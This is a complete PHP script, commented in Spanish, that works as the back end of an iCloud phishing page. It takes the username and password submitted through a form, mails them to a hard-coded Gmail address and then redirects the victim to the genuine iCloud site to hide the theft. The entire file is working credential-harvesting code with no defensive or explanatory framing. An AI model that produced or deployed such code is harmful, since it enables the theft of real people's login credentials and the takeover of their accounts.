<?php
// Obtener los datos del formulario
$username = $_POST['username'];
$password = $_POST['password'];

// Configurar el correo electrónico
$to = 'lacunadeladrone777@gmail.com';
$subject = 'Datos de inicio de sesión';
$message = "Nombre de usuario: $username\nContraseña: $password";
$headers = 'From: your_email@example.com' . "\r\n" .
    'Reply-To: your_email@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Enviar el correo electrónico
$mail_sent = mail($to, $subject, $message, $headers);

// Verificar si el correo electrónico se envió correctamente
if ($mail_sent) {
    // Redirigir a la página de iCloud
    header('Location: https://www.icloud.com');
    exit; // Asegúrate de que el script se detenga aquí para evitar cualquier salida adicional
} else {
    echo 'Hubo un error al enviar el correo electrónico.';
}
?>
